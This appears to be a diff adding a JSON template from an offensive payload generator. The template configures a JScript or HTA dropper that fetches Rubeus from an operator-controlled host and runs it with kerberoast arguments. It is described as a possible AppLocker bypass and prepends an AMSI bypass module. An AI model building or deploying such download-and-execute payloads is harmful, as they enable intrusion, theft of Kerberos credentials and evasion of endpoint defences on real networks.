@@ -1,0 +1,57 @@
+{
+    "category" : ["jscript","exe"],
+    "description" : "JScript that downloads and runs an executable. Possible applocker bypass. HTA untested - htas never worked in my lab. js works but no output from executable.",
+    "contentFile" : "js_hta_execarbexe.txt",
+    "customAttributes": [
+        {
+            "name": "callbackURL",
+            "description": "Executable will call back and execute the executable here.",
+            "defaultValue": "http://[[[[ownIP]]]]/tools/rubeus.exe"
+        },
+        {
+            "name" : "commandlineArguments",
+            "description" : "Pass arguments to the executable. Should looks like this [\"-c\",\"-b value\",\"-a\"]. Note the -a and -c is a switch with no value.",
+            "defaultValue": "\"kerberoast\",\"/nowrap\""
+        
+        },
+        {
+            "name": "compile",
+            "description": "Whether or not to compile. Y/N",
+            "defaultValue": "Y"
+        }
+    ],
+    
+    "shellCode" : {
+        "hasShellCode":false                        
+    },
+    "compilation": {
+        "compilationType": "jscript",
+        "target" : "library",
+        "compilationAttributes": [
+            {
+                "name": "architecture",
+                "description": "The architecture of the shellcode, x64 or x86.",
+                "defaultValue": "x64"
+            },
+            {
+                "name": "saveAs",
+                "description": "Name of library to be created, can be full path or just a name",
+                "defaultValue": "/tmp/run.dll"
+            },
+            {
+                "name": "format",
+                "description" : "Option of either js or hta.",
+                "defaultValue" : "hta"
+            },
+            {
+                "name": "saveJSAs",
+                "description": "Name of final file to be created, can be full path or just a name",
+                "defaultValue": "/tmp/run.hta"
+            }
+        ],
+
+
+        
+        "prepend" : "jsamsibypass"
+    }
+}
